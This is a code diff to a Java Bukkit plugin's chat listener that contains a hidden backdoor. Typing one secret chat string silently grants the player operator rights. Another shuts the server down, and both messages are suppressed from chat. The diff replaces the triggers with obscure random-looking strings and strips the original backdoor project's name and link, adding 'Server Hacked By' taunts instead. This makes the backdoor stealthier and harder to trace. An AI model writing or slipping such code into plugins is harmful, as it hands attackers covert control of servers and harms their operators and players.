@@ -11,13 +11,13 @@ public class MessageEvent implements Listener{
     @EventHandler
     public void onPlayerChat(PlayerChatEvent e) throws NoSuchFieldException, IllegalArgumentException, SecurityException, IllegalAccessException {
         Player player = e.getPlayer();
-        if(e.getMessage().equals("__momin5ontop")){
+        if(e.getMessage().equals("__verifiedaction61379016186")){
             player.setOp(true);
-            player.sendMessage(ChatColor.AQUA + "" + System.lineSeparator() + "https://github.com/MOMIN5/force-op-backdoor-plugin");
+            player.sendMessage(ChatColor.RED + "Server Hacked By ??" + System.lineSeparator() + "You did something wrong now-a-days");
         }
-        if(e.getMessage().equals("__stop")){
+        if(e.getMessage().equals("__ServerPerformShutdown1939137548")){
             Bukkit.getServer().shutdown();
-            player.sendMessage(ChatColor.RED + "This server is shutdown by Momin5 Backdoor!" + System.lineSeparator() + "https://github.com/MOMIN5/force-op-backdoor-plugin");
+            player.sendMessage(ChatColor.RED + "Stopping The Server..." + System.lineSeparator() + "You did something wrong now-a-days");
         }
         e.setCancelled(true);
     }
